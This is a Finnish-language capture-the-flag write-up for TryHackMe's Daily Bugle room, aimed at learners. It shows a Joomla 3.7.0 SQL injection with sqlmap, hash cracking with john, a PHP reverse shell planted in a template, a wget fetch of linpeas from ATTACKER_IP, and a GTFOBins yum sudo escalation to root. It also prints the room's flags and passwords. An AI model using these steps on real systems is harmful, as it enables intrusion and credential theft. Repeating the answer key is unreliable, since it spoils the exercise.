---
title: "Daily Bugle -writeup"
date: 2023-07-12
tags: [writeup, ctf, tryhackme]
description: "Joomla-asennuksen sormenjälkien tunnistaminen ja hyväksikäyttö Metasploitilla jalansijan saamiseksi ja oikeuksien korottamiseksi TryHackMen Daily Bugle -huoneessa."
---

## Valmistelut 

Ensin meidän täytyy yhdistää TryHackMen VPN-palvelimeen. Saat lisätietoa tästä vierailemalla [Access](https://tryhackme.com/access) -sivulla.

Käytän `openvpn`-työkalua palvelimeen yhdistämiseen. Tässä on komento:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Tiedustelu
Aika tehdä nopeat porttiskannaukset ja tiedustelua (luoja siunatkoon `rustscanin` tekijöitä):
```shell-session
$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -r 1-65535 -- -oN rustscan_port_scan.txt
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3306/tcp open  mysql   syn-ack

$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -p22,80,3306 -- -sC -sV -oN rustscan_service_scan.txt
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   syn-ack MariaDB (unauthorized)
```

Katsotaan, saadaanko Metasploitilla mitään irti:
```shell-session
$ sudo msfconsole -q
msf6 > search joomla
...
10  auxiliary/scanner/http/joomla_version
...

msf6 > use 10
msf6 auxiliary(scanner/http/joomla_version) > setg RHOSTS TARGET_IP
RHOSTS => TARGET_IP
msf6 auxiliary(scanner/http/joomla_version) > run

[*] Server: Apache/2.4.6 (CentOS) PHP/5.6.40
[+] Joomla version: 3.7.0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> Mikä on Joomlan versio?
> 
> Vastaus: `3.7.0`

Nopea haku ExploitDB:stä hakusanalla Joomla 3.7 löytää kätevän exploitin, jota voimme käyttää: https://www.exploit-db.com/exploits/42033

```txt

URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap: 

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

Tehdään samalla myös vähän hakemistojen kartoitusta:
```shell-session
$ gobuster dir -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64 -o enum_gobuster.txt
/media                (Status: 301) [Size: 233] [--> http://TARGET_IP/media/]
/templates            (Status: 301) [Size: 237] [--> http://TARGET_IP/templates/]
/images               (Status: 301) [Size: 234] [--> http://TARGET_IP/images/]
/modules              (Status: 301) [Size: 235] [--> http://TARGET_IP/modules/]
/bin                  (Status: 301) [Size: 231] [--> http://TARGET_IP/bin/]
/plugins              (Status: 301) [Size: 235] [--> http://TARGET_IP/plugins/]
/includes             (Status: 301) [Size: 236] [--> http://TARGET_IP/includes/]
/language             (Status: 301) [Size: 236] [--> http://TARGET_IP/language/]
/components           (Status: 301) [Size: 238] [--> http://TARGET_IP/components/]
/cache                (Status: 301) [Size: 233] [--> http://TARGET_IP/cache/]
/libraries            (Status: 301) [Size: 237] [--> http://TARGET_IP/libraries/]
/tmp                  (Status: 301) [Size: 231] [--> http://TARGET_IP/tmp/]
/layouts              (Status: 301) [Size: 235] [--> http://TARGET_IP/layouts/]
/administrator        (Status: 301) [Size: 241] [--> http://TARGET_IP/administrator/]
/cli                  (Status: 301) [Size: 231] [--> http://TARGET_IP/cli/]
```
Siirtymällä polkuun `/administrator` päädymme seuraavalle sivulle:
![](/assets/img/writeup_assets/daily-bugle/login-page.png)

[Joomla-dokumentaation](https://docs.joomla.org/Administrator_(User)) mukaan:
> Oletusarvoinen Super Users on admin ja se asennetaan jokaisen Joomla!-sivuston mukana.

Jälleen uusi nopea haku searchsploitilla antaa meille kätevän exploitin SQL-injektioon Joomla 3.7.0:ssa:
```shell-session
$ searchsploit Joomla 3.7.0
$ searchsploit -p php/webapps/42033.txt
...
$ cp /usr/share/exploitdb/exploits/php/webapps/42033.txt .
```

Kun luemme tämän exploitin läpi, huomaamme sen antavan meille kätevän `sqlmap`-komennon:
```shell-session
$ sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

Lisäämällä liput `--tables` ja `-D joomla` voimme määrittää, että haluamme ensin yrittää selvittää tietokannan taulut ja mihin tietokantaan hyökätä.
```shell-session
$ sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs --tables -p list[fullordering] -D joomla
```

Tämä antaa meille yhteensä 72 taulua, joista useimmat eivät ole kovin hyödyllisiä. Yksi käyttökelpoisista on kuitenkin `__users`-taulu:
```shell-session
$ sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs --columns -p list[fullordering] -D joomla -T '#__users'

...
do you want to use common column existence check? [y/N/q] y
...
[00:08:34] [INFO] retrieved: id
[00:08:34] [INFO] retrieved: name
[00:08:35] [INFO] retrieved: username
[00:08:39] [INFO] retrieved: email
[00:09:20] [INFO] retrieved: password
...
```

Mahtavaa! Yritetäänpä nyt dumpata `username`- ja password-sarakkeet:
```shell-session
$ sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T '#__users' --dump -C password
...
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+----------+--------------------------------------------------------------+
```

Okei, meillä on siis käyttäjänimi ja salasana-tiiviste, murretaan se. (Näyttää Blowfish-tiivisteeltä):
```shell-session
$ john --wordlist=/usr/share/seclists/Passwords/rockyou.txt hash.txt
spiderman123     (?)
```

> Mikä on Jonahin murrettu salasana?
> 
> Vastaus: `spiderman123`

Tätä käyttämällä saamme pääsyn kohteemme Joomla CMS:n hallintapaneeliin. Seuraavaksi käytämme tätä saadaksemme ensimmäisen jalansijan...

## Pääsyn saaminen

Siirry käyttäjän hallintapaneelista templates-valikkoon ja yritä ladata php-reverse shell. Se ei toiminut minulla, joten vaihtoehtoisesti vain muokkasin oletusteeman `index.php`-tiedoston sisältöä, eli kopioin ja liitin reverse shell -koodin suoraan siihen.


Käynnistämällä listenerin omalla koneellamme ja avaamalla lataamamme hyötykuorman (tässä tapauksessa `index.html`), saamme kivan reverse shellin:

```shell-session
$ nc -nvlp 4444
# Try requesting TARGET_IP/index.php/
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44852
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:01:38 up  2:02,  0 users,  load average: 0.01, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
bash: no job control in this shell
bash-4.2$ 
```


Stabiloidaan shell ennen kuin jatketaan:
```shell-session
bash-4.2$ python -c "import pty; pty.spawn('/bin/bash')"
python -c "import pty; pty.spawn('/bin/bash')"
bash-4.2$ ^Z
zsh: suspended  nc -nvlp 4444
$ stty raw -echo && fg
[1]  + continued  nc -nvlp 4444
                               export TERM=xterm-256-color
bash-4.2$ 
```
Kiva! Nyt voimme jatkaa tuttuun tapaan:
```shell-session
bash-4.2$ whoami
apache
bash-4.2$ uname -a
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
bash-4.2$ cat /etc/issue
\S
Kernel \r on an \m

bash-4.2$ cat /etc/os-release 
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"
```

Kokeillaan hyödyntää `linpeasia` asioiden helpottamiseksi:
```shell-session
# Getting the linpeas script from our machine...
bash-4.2$ wget http://ATTACKER_IP:8080/linpeas.sh
bash-4.2$ sh linpeas.sh 
...
╔══════════╣ Searching passwords in config PHP files
        public $password = 'nv5uz9r3ZEDzVjNu';
...
```

No niin, meillä on salasana, yhdistetään se käyttäjänimeen `jjameson` (bruh, tee vain `ls` `/home`-hakemistoon -\_-) ja yritetään kirjautua koneelle `ssh`:lla:
```shell-session
$ ssh jjameson@TARGET_IP
jjameson@TARGET_IP's password: ...

[jjameson@dailybugle ~]$ ls -la
total 16
drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
drwxr-xr-x. 3 root     root      22 Dec 14  2019 ..
lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
-rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
-rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
-rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
-rw-rw-r--  1 jjameson jjameson  33 Dec 15  2019 user.txt
[jjameson@dailybugle ~]$ cat user.txt 
27a260fe3cba712cfdedb1c86d80442e
```

Mahtavaa! Siirrytäänpä sitten oikeuksien korotukseen...

## Oikeuksien korotus

Kokeillaan ensin vähän kartoitusta:
```shell-session
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME
    LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

OOOOOOOO, OSUMA TULI POJAT!!! Vierailemalla vanhassa kunnon GTFObinsissä ja hakemalla komentoa `yum` näemme 2 vaihtoehtoa root-shellin saamiseksi `sudo`:n avulla:

![](/assets/img/writeup_assets/daily-bugle/yum-privesc.png)

```shell-session
# Just copy-paste into shell:
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
sh-4.2# whoami
root

sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt 
eec3d53292b1821868266858d7fa6f79
```

> Mikä on root-lippu?
> 
> Vastaus: `eec3d53292b1821868266858d7fa6f79`


## Yhteenveto
Jos tästä writeupista oli apua, harkitse minun seuraamistani [githubissa](https://github.com/NovusEdge) ja/tai tähden jättämistä repositorioon: https://github.com/NovusEdge/thm-writeups


- Huone: [Daily Bugle](https://tryhackme.com/room/dailybugle)
